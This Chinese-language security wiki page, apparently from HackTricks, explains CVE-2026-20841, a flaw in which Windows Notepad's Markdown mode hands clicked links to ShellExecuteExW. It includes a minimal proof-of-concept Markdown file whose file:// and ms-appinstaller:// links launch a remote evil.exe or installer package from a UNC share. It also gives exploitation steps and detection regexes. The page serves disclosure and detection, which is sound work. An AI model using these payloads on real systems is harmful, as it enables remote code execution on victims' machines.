# Windows Protocol Handler / ShellExecute Abuse（Markdown 渲染器）

{{#include ../banners/hacktricks-training.md}}

渲染 Markdown 或 HTML 的 Windows 应用可能会将点击的目标交给 `ShellExecuteExW`。由于 ShellExecute 会分派已注册的 URI scheme 和文件关联，渲染器需要使用明确的 allowlist，而不能假设所有链接都是 HTTP(S)。以下关于 Notepad 行为的说明描述的是 CVE-2026-20841，不应泛化到所有渲染器。<sup>[[1]](#references)[[3]](#references)</sup>

## Windows Notepad Markdown 模式中的 ShellExecuteExW 攻击面
- Notepad **仅针对 `.md` 扩展名**选择 Markdown 模式，方法是在 `sub_1400ED5D0()` 中进行固定字符串比较。<sup>[[1]](#references)</sup>
- 支持的 Markdown 链接：
  - 标准格式：`[text](target)`
  - 自动链接：`<target>`（渲染为 `[target](target)`），因此这两种语法都与 payload 和检测有关。
- 链接点击由 `sub_140170F60()` 处理；该函数会进行薄弱的过滤，然后调用 `ShellExecuteExW`。
- `ShellExecuteExW` 会分派到**任何已配置的协议处理程序**，而不仅仅是 HTTP(S)。<sup>[[1]](#references)</sup>

### Payload 注意事项
- 链接中的任何 `\\` 序列都会在传给 `ShellExecuteExW` 之前**规范化为 `\`**，这会影响 UNC/路径构造和检测。
- 默认情况下，`.md` 文件**不会关联到 Notepad**；受害者仍须在 Notepad 中打开该文件并点击链接，但链接在渲染后可以点击。
- 危险的示例 scheme：<sup>[[1]](#references)</sup>
  - `file://` 用于启动本地/UNC payload。
  - `ms-appinstaller://` 用于触发 App Installer 流程。其他本地注册的 scheme 也可能被滥用。

### 最简 PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### 利用流程
1. 构造一个 **`.md` 文件**，使 Notepad 将其渲染为 Markdown。
2. 嵌入一个使用危险 URI scheme（`file:`、`ms-appinstaller:` 或任何已安装的 handler）的链接。
3. 通过 HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB 或类似方式发送该文件，并诱使用户在 Notepad 中打开。
4. 用户点击链接时，**规范化后的链接**会传递给 `ShellExecuteExW`，相应的 protocol handler 会在用户上下文中执行所引用的内容。<sup>[[1]](#references)[[2]](#references)</sup>

## 检测思路
- 监控通过常用于传输文档的端口/协议传输 `.md` 文件：`20/21 (FTP)`、`80 (HTTP)`、`443 (HTTPS)`、`110 (POP3)`、`143 (IMAP)`、`25/587 (SMTP)`、`139/445 (SMB/CIFS)`、`2049 (NFS)`、`111 (portmap)`。
- 解析 Markdown 链接（标准链接和自动链接），查找**不区分大小写**的 `file:` 或 `ms-appinstaller:`。
- 使用供应商提供的正则表达式检测远程资源访问：
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- ZDI 描述的供应商修复将接受的目标限制为本地文件和 HTTP(S)。由于各系统上注册的攻击面有所不同，应根据需要扩展检测范围，涵盖其他已安装的协议处理程序。<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841：Windows Notepad 中的任意代码执行](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
